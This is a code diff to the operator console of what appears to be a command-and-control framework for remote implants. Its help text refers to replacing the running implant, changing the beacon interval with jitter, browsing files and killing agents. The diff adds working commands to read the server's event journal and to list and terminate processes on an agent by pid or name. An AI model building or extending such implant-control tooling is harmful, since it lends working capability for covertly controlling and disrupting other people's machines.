@@ -445,6 +445,15 @@ def watch_events(client: OperatorClient, limit: int = 0, as_json: bool = False) 
         return 0
 
 
+def print_events(rows: List[Dict[str, Any]]) -> None:
+    """Print a list of journal events, oldest first."""
+    if not rows:
+        print("no event")
+        return
+    for ev in rows:
+        print_event(ev)
+
+
 def print_event(ev: Dict[str, Any], stream: Any = None) -> None:
     kind = ev.get("kind", "?")
     at = fmt_ts(ev.get("at"))
@@ -656,6 +665,9 @@ class Console:
                     return True
                 res = self.client.retry(rest[0])
                 print(f"queued {res.get('task_id')} (the task {rest[0]} is retried)")
+            elif cmd == "events":
+                limit = int(rest[0]) if rest else 50
+                print_events(self.client.events(0, limit).get("events") or [])
             elif cmd == "watch":
                 self.watch = (rest[0].lower() not in ("off", "0", "false")) if rest else (not self.watch)
                 print(f"event watch: {'on' if self.watch else 'off'}")
@@ -926,6 +938,7 @@ def print_help() -> None:
   update <path>             replace the running implant
   browse [path]             list the files under a path
   report [agent]            write a report about an agent
+  events [limit]            the recent events of the server's journal
   watch [on|off]            toggle automatic result printing
   sleep <secs> [jitter%]    change the beacon interval
   kill [agent-id]           tell an agent to exit
@@ -1325,6 +1338,10 @@ def build_parser() -> argparse.ArgumentParser:
     cancel.add_argument("task_id")
 
     watch = sub.add_parser("watch", help="stream events until interrupted")
+    events_cmd = sub.add_parser("events", help="the recent events of the server's journal")
+    events_cmd.add_argument("--limit", type=int, default=50)
+    events_cmd.add_argument("--after", type=int, default=0)
+    events_cmd.add_argument("--kind", default="")
     watch.add_argument("--limit", type=int, default=0, help="stop after N events (0 = forever)")
 
     sleep = sub.add_parser("sleep", help="change beacon interval")
@@ -1411,6 +1428,17 @@ def build_parser() -> argparse.ArgumentParser:
     update.add_argument("--sha256", default="", help="the expected digest of the new binary")
     update.add_argument("--wait", action="store_true")
     update.add_argument("--timeout", type=float, default=120.0)
+
+    procs = sub.add_parser("proc", help="the process table of an agent")
+    procs.add_argument("agent")
+    procs.add_argument("--wait", action="store_true")
+    procs.add_argument("--timeout", type=float, default=120.0)
+
+    prockill = sub.add_parser("proc-kill", help="terminate a process on an agent")
+    prockill.add_argument("agent")
+    prockill.add_argument("target", help="the pid or the name of the process")
+    prockill.add_argument("--wait", action="store_true")
+    prockill.add_argument("--timeout", type=float, default=120.0)
 
     report = sub.add_parser("report", help="write a report about one agent")
     report.add_argument("agent")
@@ -1750,6 +1778,15 @@ def main(argv: Optional[List[str]] = None) -> int:
                 emit({"task_id": args.task_id, "state": "cancelled"})
             else:
                 print(f"cancelled {args.task_id}")
+        elif args.cmd == "events":
+            res = client.events(args.after, args.limit)
+            rows = res.get("events") or []
+            if args.kind:
+                rows = [e for e in rows if e.get("kind") == args.kind]
+            if args.json:
+                emit(rows)
+            else:
+                print_events(rows)
         elif args.cmd == "watch":
             return watch_events(client, args.limit, as_json=args.json)
         elif args.cmd == "sleep":
@@ -1947,6 +1984,18 @@ def main(argv: Optional[List[str]] = None) -> int:
         elif args.cmd == "update":
             run_task_and_wait(client, console, args.agent, "update",
                               {"path": args.path, "sha256": args.sha256},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "proc":
+            run_task_and_wait(client, console, args.agent, "ps", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "proc-kill":
+            target = args.target.strip()
+            task_args: Dict[str, Any] = {}
+            if target.isdigit():
+                task_args["pid"] = int(target)
+            else:
+                task_args["name"] = target
+            run_task_and_wait(client, console, args.agent, "proc.kill", task_args,
                               args.wait, args.timeout, args.json)
         elif args.cmd == "report":
             text = build_report(client, args.agent, args.limit, console.store)
